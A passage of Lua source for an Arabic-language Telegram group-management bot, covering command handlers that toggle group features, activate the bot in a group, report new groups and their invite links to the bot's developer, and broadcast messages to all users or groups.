local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الالعاب المتطوره بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:Gamesinline'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب المتطوره' and Manager(msg) and ChCheck(msg) or text == 'تعطيل الالعاب الاحترافيه' and Manager(msg) and ChCheck(msg) then  
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الالعاب المتطوره بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:Gamesinline'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" and ChCheck(msg) or text == "تفعيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل جلب رابط المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" and ChCheck(msg) or text == "تعطيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل جلب رابط المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
if text == "تعطيل الرابط انلاين" and ChCheck(msg) or text == "تعطيل جلب الرابط انلاين" and ChCheck(msg) then 
if Admin(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل جلب رابط انلاين المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
if text == "تفعيل الرابط انلاين" and ChCheck(msg) or text == "تفعيل جلب الرابط انلاين" and ChCheck(msg) then 
if Admin(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل جلب رابط انلاين المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
if text and (text == "تفعيل حذف الردود" or text == "تفعيل مسح الردود") and ChCheck(msg) then 
if not JokerConstructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل حذف ردود المدير'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:GpRd"..msg.chat_id_)
return false  
end
end
if text and (text == "تعطيل حذف الردود" or text == "تعطيل مسح الردود") and ChCheck(msg) then 
if not JokerConstructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل حذف ردود المدير'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
if text and (text == "تفعيل اضف رد" or text == "تفعيل اضافه رد" or text == "تفعيل حذف رد" or text == "تفعيل حذف رد عام" or text == "تفعيل اضف رد عام") and ChCheck(msg) then 
if not JokerConstructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل اضف رد'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:Rd"..msg.chat_id_)
return false  
end
end
if text and (text == "تعطيل اضف رد" or text == "تعطيل اضافه رد" or text == "تعطيل حذف رد" or text == "تعطيل حذف رد عام" or text == "تعطيل اضف رد عام") and ChCheck(msg) then 
if not JokerConstructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل اضف رد'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
if text == "تعطيل الكيبورد" and ChCheck(msg) then 
if JokerConstructor(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الكيبورد المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
if text == "تفعيل الكيبورد" and ChCheck(msg) then 
if JokerConstructor(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الكيبورد المجموعه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source BlAcK     --
if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevJoker:get(BlAcK..'Joker:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevJoker:get(BlAcK..'Joker:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,Joker) 
local admins = Joker.members_
for i=0 , #admins do
if Joker.members_[i].bot_info_ == false and Joker.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if Joker.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevJoker:sadd(BlAcK.."Joker:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevJoker:sadd(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevJoker:srem(BlAcK.."Joker:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevJoker:srem(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevJoker:sismember(BlAcK..'Joker:Groups',msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevJoker:sadd(BlAcK.."Joker:Groups",msg.chat_id_)
if not DevJoker:get(BlAcK..'Joker:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevJoker:incrby(BlAcK..'Joker:Sudos'..msg.sender_user_id_,1)
DevJoker:set(BlAcK..'Joker:SudosGp'..msg.sender_user_id_..msg.chat_id_,"Joker")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevJoker:set(BlAcK.."Joker:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevJoker:sismember(BlAcK..'Joker:Groups',msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تعطيل المجموعه "..dp.title_)  
DevJoker:srem(BlAcK.."Joker:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevJoker:set(BlAcK.."Joker:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"᥀︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     Source BlAcK     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩"
else
LinkGroup = '᥀︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
end
if not Sudo(msg) then
SendText(DevId,"᥀︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الشخص ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     Source BlAcK     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' or text == '↫ روابط المجموعات ᥀' then
if not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
local List = DevJoker:smembers(BlAcK.."Joker:Groups")
if #List == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا توجد مجموعات مفعله', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
local Text = "᥀︙Source BlAcK\n᥀︙File Bot Groups\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevJoker:scard(BlAcK.."Joker:Managers:"..v) or 0
local GroupsAdmins = DevJoker:scard(BlAcK.."Joker:Admins:"..v) or 0
local Groupslink = DevJoker:get(BlAcK.."Joker:Groups:Links" ..v)
Text = Text..k.." ↬ ⤈ \n᥀︙Group ID ↬ "..v.."\n᥀︙Group Link ↬ "..(Groupslink or "Not Found").."\n᥀︙Group Managers ↬ "..GroupsManagers.."\n᥀︙Group Admins ↬ "..GroupsAdmins.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
--     Source BlAcK     --
if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه خاص ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevJoker:get(BlAcK.."Joker:Send:Bot"..BlAcK) and not JokerSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevJoker:setex(BlAcK.."Joker:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevJoker:get(BlAcK.."Joker:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevJoker:smembers(BlAcK..'Joker:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
JokerText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
JokerText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
JokerText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
JokerText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
JokerText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
JokerText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
JokerText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
JokerText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة "..JokerText.." بنجاح \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source BlAcK     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه عام ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevJoker:get(BlAcK.."Joker:Send:Bot"..BlAcK) and not JokerSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevJoker:setex(BlAcK.."Joker:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevJoker:get(BlAcK.."Joker:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevJoker:smembers(BlAcK..'Joker:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
JokerText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
JokerText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
JokerText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
JokerText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
JokerText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
JokerText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
JokerText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
JokerText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة "..JokerText.." بنجاح \n᥀︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source BlAcK     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه عام بالتوجيه ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevJoker:get(BlAcK.."Joker:Send:Bot"..BlAcK) and not JokerSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevJoker:setex(BlAcK.."Joker:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevJoker:get(BlAcK.."Joker:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevJoker:smembers(BlAcK..'Joker:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source BlAcK     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه خاص بالتوجيه ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevJoker:get(BlAcK.."Joker:Send:Bot"..BlAcK) and not JokerSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevJoker:setex(BlAcK.."Joker:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevJoker:get(BlAcK.."Joker:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevJoker:smembers(BlAcK..'Joker:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source BlAcK     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه بالتثبيت ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevJoker:get(BlAcK.."Joker:Send:Bot"..BlAcK) and not JokerSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevJoker:setex(BlAcK.."Joker:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevJoker:get(BlAcK.."Joker:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevJoker:del(BlAcK.."Joker:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevJoker:smembers(BlAcK.."Joker:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
JokerText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
JokerText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevJoker:set(BlAcK..'Joker:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
JokerText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
